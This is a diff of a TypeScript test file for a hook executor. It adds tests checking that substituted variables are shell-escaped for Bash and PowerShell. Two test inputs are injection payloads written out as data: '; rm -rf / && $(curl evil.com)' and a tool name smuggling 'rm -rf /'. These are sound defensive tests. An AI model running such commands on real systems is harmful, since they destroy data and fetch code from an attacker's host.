@@ -14,52 +14,86 @@ const baseInput: HookInput = {
 };
 
 describe('HookExecutor', () => {
+  describe('escapeBash', () => {
+    it('wraps simple string in single quotes', () => {
+      expect(HookExecutor.escapeBash('hello')).toBe("'hello'");
+    });
+
+    it('escapes internal single quotes', () => {
+      expect(HookExecutor.escapeBash("it's")).toBe("'it'\\''s'");
+    });
+
+    it('handles empty string', () => {
+      expect(HookExecutor.escapeBash('')).toBe("''");
+    });
+
+    it('neutralizes shell metacharacters by wrapping in single quotes', () => {
+      const dangerous = '; rm -rf / && $(curl evil.com)';
+      const escaped = HookExecutor.escapeBash(dangerous);
+      expect(escaped).toBe("'; rm -rf / && $(curl evil.com)'");
+      // The literal characters are preserved but wrapped in single quotes,
+      // so bash treats the entire string as a literal — no expansion.
+      expect(escaped.startsWith("'")).toBe(true);
+      expect(escaped.endsWith("'")).toBe(true);
+    });
+  });
+
+  describe('escapePowerShell', () => {
+    it('wraps simple string in single quotes', () => {
+      expect(HookExecutor.escapePowerShell('hello')).toBe("'hello'");
+    });
+
+    it('doubles internal single quotes', () => {
+      expect(HookExecutor.escapePowerShell("it's")).toBe("'it''s'");
+    });
+
+    it('handles empty string', () => {
+      expect(HookExecutor.escapePowerShell('')).toBe("''");
+    });
+  });
+
   describe('substituteVariables', () => {
-    it('replaces $TOOL_NAME', () => {
-      expect(HookExecutor.substituteVariables('echo $TOOL_NAME', baseInput)).toBe(
-        'echo browser_dom',
-      );
+    it('replaces $TOOL_NAME with bash-escaped value', () => {
+      const result = HookExecutor.substituteVariables('echo $TOOL_NAME', baseInput);
+      expect(result).toBe("echo 'browser_dom'");
     });
 
-    it('replaces $FILE_PATH from tool_input.file_path', () => {
-      expect(HookExecutor.substituteVariables('cat $FILE_PATH', baseInput)).toBe(
-        'cat /tmp/test.txt',
-      );
+    it('replaces $FILE_PATH with bash-escaped value', () => {
+      const result = HookExecutor.substituteVariables('cat $FILE_PATH', baseInput);
+      expect(result).toBe("cat '/tmp/test.txt'");
     });
 
-    it('replaces $ARGUMENTS with JSON', () => {
+    it('replaces $ARGUMENTS with escaped JSON', () => {
       const result = HookExecutor.substituteVariables('echo $ARGUMENTS', baseInput);
-      expect(result).toContain('"action":"click"');
+      expect(result).toContain("'");
+      // JSON is inside quotes
+      const inner = result.replace('echo ', '');
+      expect(inner.startsWith("'")).toBe(true);
     });
 
     it('replaces $SESSION_ID', () => {
-      expect(HookExecutor.substituteVariables('echo $SESSION_ID', baseInput)).toBe(
-        'echo sess_1',
-      );
+      const result = HookExecutor.substituteVariables('echo $SESSION_ID', baseInput);
+      expect(result).toBe("echo 'sess_1'");
     });
 
     it('replaces $CWD', () => {
-      expect(HookExecutor.substituteVariables('cd $CWD', baseInput)).toBe(
-        'cd /home/user',
-      );
+      const result = HookExecutor.substituteVariables('cd $CWD', baseInput);
+      expect(result).toBe("cd '/home/user'");
     });
 
     it('replaces $CURRENT_URL', () => {
-      expect(HookExecutor.substituteVariables('curl $CURRENT_URL', baseInput)).toBe(
-        'curl https://example.com',
-      );
+      const result = HookExecutor.substituteVariables('curl $CURRENT_URL', baseInput);
+      expect(result).toBe("curl 'https://example.com'");
     });
 
     it('replaces $CURRENT_DOMAIN', () => {
-      expect(HookExecutor.substituteVariables('echo $CURRENT_DOMAIN', baseInput)).toBe(
-        'echo example.com',
-      );
+      const result = HookExecutor.substituteVariables('echo $CURRENT_DOMAIN', baseInput);
+      expect(result).toBe("echo 'example.com'");
     });
 
     it('replaces $TAB_ID', () => {
-      expect(HookExecutor.substituteVariables('echo $TAB_ID', baseInput)).toBe(
-        'echo 42',
-      );
+      const result = HookExecutor.substituteVariables('echo $TAB_ID', baseInput);
+      expect(result).toBe("echo '42'");
     });
 
     it('replaces multiple variables in one string', () => {
@@ -67,10 +101,10 @@ describe('HookExecutor', () => {
         '$TOOL_NAME on tab $TAB_ID',
         baseInput,
       );
-      expect(result).toBe('browser_dom on tab 42');
+      expect(result).toBe("'browser_dom' on tab '42'");
     });
 
-    it('handles missing optional fields', () => {
+    it('handles missing optional fields with empty escaped strings', () => {
       const minimalInput: HookInput = {
         hook_event_name: 'SessionStart',
         session_id: 's1',
@@ -79,7 +113,35 @@ describe('HookExecutor', () => {
         '$TOOL_NAME $CWD $TAB_ID',
         minimalInput,
       );
-      expect(result).toBe('  ');
+      expect(result).toBe("'' '' ''");
+    });
+
+    it('uses PowerShell escaping when shell is powershell', () => {
+      const input: HookInput = {
+        hook_event_name: 'PreToolUse',
+        session_id: 'sess_1',
+        tool_name: "it's",
+      };
+      const result = HookExecutor.substituteVariables(
+        'echo $TOOL_NAME',
+        input,
+        'powershell',
+      );
+      // PowerShell doubles single quotes
+      expect(result).toBe("echo 'it''s'");
+    });
+
+    it('prevents command injection via tool_name', () => {
+      const maliciousInput: HookInput = {
+        hook_event_name: 'PreToolUse',
+        session_id: 'sess_1',
+        tool_name: "'; rm -rf /; echo '",
+      };
+      const result = HookExecutor.substituteVariables('echo $TOOL_NAME', maliciousInput);
+      // The value is wrapped in single quotes with internal quotes escaped
+      // so the shell treats it as a literal string, not commands
+      expect(result).not.toContain("echo ''; rm");
+      expect(result).toContain("'\\''");
     });
   });
 
@@ -138,20 +200,29 @@ describe('HookExecutor', () => {
     });
   });
 
-  describe('execute — recursion guard', () => {
-    it('blocks execution beyond max depth', async () => {
+  describe('execute — recursion guard via depth parameter', () => {
+    it('blocks execution at max depth', async () => {
       const executor = new HookExecutor();
-      // Manually set depth via private static — we test the guard
-      // by calling execute with an HTTP hook (which won't actually connect)
-      // nested calls would increment depth.
-      // For this test, we verify the guard exists by testing at depth 0 first.
       const result = await executor.execute(
         { type: 'command', command: 'echo hi' },
         baseInput,
+        undefined,
+        3, // MAX_RECURSION_DEPTH
       );
-      // In extension mode, command hooks return unsupported (which is fine)
-      // The recursion guard would fire before that check at depth >= 3
-      expect(result.outcome).toBeDefined();
+      expect(result.outcome).toBe('non_blocking_error');
+      expect(result.stderr).toContain('recursion depth exceeded');
+    });
+
+    it('allows execution below max depth', async () => {
+      const executor = new HookExecutor();
+      const result = await executor.execute(
+        { type: 'command', command: 'echo hi' },
+        baseInput,
+        undefined,
+        2, // below max
+      );
+      // In extension mode this returns unsupported, not recursion error
+      expect(result.stderr).not.toContain('recursion depth exceeded');
     });
   });
 
